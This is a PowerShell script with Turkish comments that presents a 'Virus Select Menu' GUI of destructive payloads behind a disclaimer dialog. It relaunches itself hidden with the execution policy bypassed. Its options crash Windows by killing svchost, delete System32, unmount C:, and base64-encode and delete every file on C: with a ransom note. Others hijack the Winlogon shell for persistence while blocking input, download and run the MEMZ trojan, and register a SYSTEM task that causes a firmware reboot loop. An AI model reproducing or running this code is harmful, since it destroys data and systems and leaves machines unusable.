# Log kaydını başlat
Start-Transcript -Path "$($env:TEMP)\script_log.txt" -Append

# Yürütme politikasını otomatik olarak ayarla
try {
    if ((Get-ExecutionPolicy) -eq 'Restricted') {
        Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force -ErrorAction Stop
        Write-Host "Yürütme politikası RemoteSigned olarak ayarlandı." -ForegroundColor Green
    }
} catch {
    [System.Windows.Forms.MessageBox]::Show(
        "Yürütme politikası ayarlanırken hata oluştu: $($_.Exception.Message)",
        "Hata",
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Error
    )
    Write-Host "Hata: Yürütme politikası ayarlanamadı." -ForegroundColor Red
    exit
}

# Log kaydını başlat
Start-Transcript -Path "$($env:TEMP)\script_log.txt" -Append

# Gerekli assembly'leri yükle
try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
    [System.Windows.Forms.Application]::EnableVisualStyles()
} catch {
    Write-Host "Hata: Windows Forms veya System.Drawing yüklenemedi! $($_.Exception.Message)" -ForegroundColor Red
    [System.Windows.Forms.MessageBox]::Show(
        "Kütüphaneler yüklenirken hata oluştu: $($_.Exception.Message)",
        "Hata",
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Error
    )
    exit
}

# Yürütme politikasını kontrol et
if ((Get-ExecutionPolicy) -eq 'Restricted') {
    [System.Windows.Forms.MessageBox]::Show(
        "PowerShell yürütme politikası 'Restricted' olarak ayarlı. Lütfen yönetici olarak PowerShell'i açıp 'Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned' komutunu çalıştırın.",
        "Hata",
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Error
    )
    Write-Host "Hata: Yürütme politikası Restricted." -ForegroundColor Red
    exit
}

# Yönetici haklarıyla çalıştırılmalı
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    [System.Windows.Forms.MessageBox]::Show(
        "Bu script'i yönetici haklarıyla çalıştırmalısınız.",
        "Hata",
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Error
    )
    Write-Host "Hata: Yönetici hakları olmadan çalıştırıldı." -ForegroundColor Red
    exit
}

# Script bloğu
$scriptBlock = {
    # Gerekli assembly'leri yeniden yükle (gizli işlemde emin olmak için)
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        [System.Windows.Forms.Application]::EnableVisualStyles()
    } catch {
        [System.Windows.Forms.MessageBox]::Show(
            "Kütüphaneler yüklenirken hata oluştu: $($_.Exception.Message)",
            "Hata",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
        exit
    }

    # Başlangıçta ses efekti (bip sesi)
    for ($i = 0; $i -lt 5; $i++) {
        [Console]::Beep(1000, 200)
        Start-Sleep -Milliseconds 100
    }

    # Gelişmiş uyarı MessageBox
    $warningForm = New-Object System.Windows.Forms.Form
    $warningForm.Text = "WARNING!!!"
    $warningForm.Size = New-Object System.Drawing.Size(600, 400)
    $warningForm.StartPosition = "CenterScreen"
    $warningForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
    $warningForm.MaximizeBox = $false
    $warningForm.MinimizeBox = $false
    $warningForm.BackColor = [System.Drawing.Color]::DarkRed
    $warningForm.ForeColor = [System.Drawing.Color]::White

    # Uyarı mesajı
    $warningLabel = New-Object System.Windows.Forms.Label
    $warningLabel.Text = "THIS IS DANGEROUS! DO NOT RUN ON A REAL PC!`nWE ARE NOT RESPONSIBLE FOR ANY DAMAGE.`nCHECK 'I DO ACCEPT' AND PRESS OK TO PROCEED."
    $warningLabel.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 14, [System.Drawing.FontStyle]::Bold)
    $warningLabel.AutoSize = $true
    $warningLabel.Location = New-Object System.Drawing.Point(30, 30)
    $warningForm.Controls.Add($warningLabel)

    # Checkbox
    $acceptCheckBox = New-Object System.Windows.Forms.CheckBox
    $acceptCheckBox.Text = "I DO ACCEPT"
    $acceptCheckBox.Location = New-Object System.Drawing.Point(30, 200)
    $acceptCheckBox.AutoSize = $true
    $acceptCheckBox.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 12)
    $acceptCheckBox.ForeColor = [System.Drawing.Color]::Yellow
    $warningForm.Controls.Add($acceptCheckBox)

    # OK Butonu
    $okButtonWarning = New-Object System.Windows.Forms.Button
    $okButtonWarning.Location = New-Object System.Drawing.Point(180, 280)
    $okButtonWarning.Size = New-Object System.Drawing.Size(150, 40)
    $okButtonWarning.Text = "OK"
    $okButtonWarning.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 12)
    $okButtonWarning.BackColor = [System.Drawing.Color]::Green
    $okButtonWarning.Enabled = $false
    $warningForm.Controls.Add($okButtonWarning)

    # Cancel Butonu
    $cancelButton = New-Object System.Windows.Forms.Button
    $cancelButton.Location = New-Object System.Drawing.Point(350, 280)
    $cancelButton.Size = New-Object System.Drawing.Size(150, 40)
    $cancelButton.Text = "CANCEL"
    $cancelButton.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 12)
    $cancelButton.BackColor = [System.Drawing.Color]::Gray
    $warningForm.Controls.Add($cancelButton)

    # Checkbox değiştiğinde OK butonunu kontrol et
    $acceptCheckBox.Add_CheckedChanged({
        $okButtonWarning.Enabled = $acceptCheckBox.Checked
    })

    # OK butonuna tıklama
    $okButtonWarning.Add_Click({
        $warningForm.DialogResult = [System.Windows.Forms.DialogResult]::OK
        $warningForm.Close()
    })

    # Cancel butonuna tıklama
    $cancelButton.Add_Click({
        $warningForm.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
        $warningForm.Close()
    })

    # Formu göster ve sonucu kontrol et
    try {
        $result = $warningForm.ShowDialog()
        if ($result -eq [System.Windows.Forms.DialogResult]::Cancel) {
            [System.Windows.Forms.MessageBox]::Show("Closing gui...", "Close", "OK", "Information")
            exit
        }
    } catch {
        [System.Windows.Forms.MessageBox]::Show(
            "Uyarı formu açılırken hata oluştu: $($_.Exception.Message)",
            "Hata",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
        exit
    } finally {
        $warningForm.Dispose()
    }

    # BlockInput ve fare kontrolü için API tanımlamaları
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class InputBlocker {
        [DllImport("user32.dll")]
        public static extern bool BlockInput(bool fBlockIt);

        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
    }
"@

    # Ses kontrolü için API tanımlaması
    Add-Type -TypeDefinition @"
    using System.Runtime.InteropServices;
    public class Audio {
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
    }
"@

    # GUI oluşturma
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Virus Select Menu"
    $form.Size = New-Object System.Drawing.Size(600, 400)
    $form.StartPosition = "CenterScreen"
    $form.MaximizeBox = $false
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
    $form.BackColor = [System.Drawing.Color]::White

    # Başlık etiketi oluştur
    $titleLabel = New-Object System.Windows.Forms.Label
    $titleLabel.Text = "Virus Select Menu"
    $titleLabel.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 14, [System.Drawing.FontStyle]::Bold)
    $titleLabel.AutoSize = $true
    $titleLabel.Location = New-Object System.Drawing.Point(150, 30)
    $form.Controls.Add($titleLabel)

    # ComboBox oluşturma
    $comboBox = New-Object System.Windows.Forms.ComboBox
    $comboBox.Location = New-Object System.Drawing.Point(150, 100)
    $comboBox.Size = New-Object System.Drawing.Size(300, 40)
    $comboBox.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 12)
    $comboBox.Items.AddRange(@(
        "Blue Screen",
        "Mountvol C:",
        "Test MsgBox",
        "Shutdown Pc",
        "Good Bye Pc :D",
        "Spam TXT",
        "Delete System32!",
        "WannaCry But Bad",
        "Sigma Boy Virus🗿",
        "Original Memz Trojan",
        "BIOS Loop"
    ))
    $comboBox.SelectedIndex = 0
    $comboBox.DropDownStyle = [System.Windows.Forms.ComboBoxStyle]::DropDownList
    $form.Controls.Add($comboBox)

    # OK Butonu
    $okButton = New-Object System.Windows.Forms.Button
    $okButton.Location = New-Object System.Drawing.Point(350, 280)
    $okButton.Size = New-Object System.Drawing.Size(150, 40)
    $okButton.Text = "Execute"
    $okButton.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 12)
    $okButton.BackColor = [System.Drawing.Color]::White
    $okButton.ForeColor = [System.Drawing.Color]::Black
    $form.Controls.Add($okButton)

    # Credits Label
    $creditsLabel = New-Object System.Windows.Forms.Label
    $creditsLabel.Text = "Credits: Aras and Baris"
    $creditsLabel.AutoSize = $true
    $creditsLabel.Location = New-Object System.Drawing.Point(150, 340) # Görünür konum
    $creditsLabel.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 12) # Daha büyük yazı tipi
    $creditsLabel.ForeColor = [System.Drawing.Color]::Black
    $form.Controls.Add($creditsLabel)

    # OK butonuna tıklama olayı
    $okButton.Add_Click({
        $selectedItem = $comboBox.SelectedItem
        if ($selectedItem) {
            switch ($selectedItem) {
                "Blue Screen" {
                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c taskkill /f /im svchost.exe" -NoNewWindow -Wait
                }
                "Mountvol C:" {
                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c mountvol C: /d" -NoNewWindow -Wait
                }
                "Test MsgBox" {
                    [System.Windows.Forms.MessageBox]::Show("TEST SUCCESSFUL!", "Test", "OK", "Information")
                }
                "Shutdown Pc" {
                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown -s -t 00" -NoNewWindow -Wait
                }
                "Good Bye Pc :D" {
                    $result = [System.Windows.Forms.MessageBox]::Show(
                        "PC will restart on boot! Sure?",
                        "WARNING!",
                        "OKCancel",
                        "Warning"
                    )
                    if ($result -eq "OK") {
                        $batContent = @"
@echo off
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sa.bat"
shutdown -r -t 00
"@
                        $batPath = "$($env:TEMP)\sa.bat"
                        Set-Content -Path $batPath -Value $batContent -Encoding ASCII
                        Start-Process -FilePath $batPath -NoNewWindow
                    }
                }
                "Spam TXT" {
                    while ($true) {
                        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
                        $filePath = "C:\${randomName}.txt"
                        $sizeInBytes = 10MB
                        $content = -join ((33..126) | Get-Random -Count $sizeInBytes | % {[char]$_})
                        [System.IO.File]::WriteAllText($filePath, $content)
                        Start-Sleep -Milliseconds 100
                    }
                }
                "Delete System32!" {
                    $result = [System.Windows.Forms.MessageBox]::Show(
                        "THIS WILL DESTROY YOUR SYSTEM! SURE?",
                        "DANGER!",
                        "OKCancel",
                        "Error"
                    )
                    if ($result -eq "OK") {
                        $system32Path = "C:\Windows\System32"
                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c takeown /f $system32Path /r /d y && icacls $system32Path /grant administrators:F /t" -NoNewWindow -Wait
                        Remove-Item -Path $system32Path -Recurse -Force -ErrorAction SilentlyContinue
                    }
                }
                "WannaCry But Bad" {
                    $result = [System.Windows.Forms.MessageBox]::Show(
                        "ALL FILES WILL BE ENCRYPTED! NO WAY BACK! SURE?",
                        "WannaCry Simulation",
                        "OKCancel",
                        "Error"
                    )
                    if ($result -eq "OK") {
                        $files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue
                        $encryptionKey = "WannaCrySimulationKey123"
                        foreach ($file in $files) {
                            $content = [System.IO.File]::ReadAllBytes($file.FullName)
                            $encryptedContent = [Convert]::ToBase64String($content)
                            $newFileName = $file.FullName + ".djashdk"
                            [System.IO.File]::WriteAllText($newFileName, $encryptedContent)
                            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
                        }
                        $ransomNote = @"
Your files are GONE! WannaCry Simulation complete.
Send 1 BTC to: [FakeAddress]
"@
                        Set-Content -Path "C:\README.txt" -Value $ransomNote -Force
                    }
                }
                "Sigma Boy Virus🗿" {
                    $form.Close()
                    [InputBlocker]::BlockInput($true)
                    $scriptPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menuස
                    Menu\Programs\Startup\prank.ps1"
                    Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
                    for ($i = 0; $i -lt 50; $i++) {
                        [Audio]::keybd_event(0xAF, 0, 0, 0)
                        Start-Sleep -Milliseconds 10
                    }
                    $videoUrl = "https://www.youtube.com/watch?v=_z2RvL2s5rQ"
                    Start-Process "msedge" -ArgumentList "--kiosk $videoUrl"
                    Start-Sleep -Seconds 5
                    $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
                    $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
                    $clickX = [math]::Floor($screenWidth / 2)
                    $clickY = [math]::Floor($screenHeight / 2)
                    [InputBlocker]::SetCursorPos($clickX, $clickY)
                    [InputBlocker]::mouse_event(0x0002, 0, 0, 0, 0)
                    Start-Sleep -Milliseconds 100
                    [InputBlocker]::mouse_event(0x0004, 0, 0, 0, 0)
                    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
                    Set-ItemProperty -Path $regPath -Name "Shell" -Value "powershell.exe -ExecutionPolicy Bypass -File $scriptPath" -Force
                    while ($true) { Start-Sleep -Seconds 1 }
                }
                "Original Memz Trojan" {
                    $form.Close()
                    $memzUrl = "https://github.com/RobloxScripts490/Vir-s/raw/refs/heads/main/MEMZ.exe"
                    $memzPath = "$($env:TEMP)\MEMZ.exe"
                    try {
                        Invoke-WebRequest -Uri $memzUrl -OutFile $memzPath -ErrorAction Stop
                        Start-Process -FilePath $memzPath -NoNewWindow
                    } catch {
                        [System.Windows.Forms.MessageBox]::Show(
                            "MEMZ DOWNLOAD FAILED! CHECK CONNECTION!",
                            "Error",
                            "OK",
                            "Error"
                        )
                    }
                }
                "BIOS Loop" {
                    $result = [System.Windows.Forms.MessageBox]::Show(
                        "This will force a BIOS reboot loop! Sure?",
                        "BIOS Loop Warning",
                        "OKCancel",
                        "Warning"
                    )
                    if ($result -eq "OK") {
                        $taskName = "BIOSLoopTask"
                        $scriptPath = "$env:TEMP\biosloop.ps1"
                        $taskScript = @"
Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown /r /fw /t 1" -NoNewWindow
"@
                        Set-Content -Path $scriptPath -Value $taskScript -Force
                        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $scriptPath"
                        $trigger = New-ScheduledTaskTrigger -AtStartup
                        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
                        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
                        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown /r /fw /t 1" -NoNewWindow
                    }
                }
            }
        }
    })

    # Formu göster
    try {
        Write-Host "Form gösteriliyor..." -ForegroundColor Green
        [void]$form.ShowDialog()
        Write-Host "Form kapatıldı." -ForegroundColor Green
    } catch {
        [System.Windows.Forms.MessageBox]::Show(
            "Form açılırken hata oluştu: $($_.Exception.Message)",
            "Hata",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    } finally {
        $form.Dispose()
    }
}

# Script bloğunu bir dosyaya kaydet ve gizli çalıştır
$scriptPath = "$($env:TEMP)\hidden_script.ps1"
$scriptBlock | Out-File -FilePath $scriptPath -Encoding UTF8
Start-Process powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -NoNewWindow

# Log kaydını durdur
Stop-Transcript
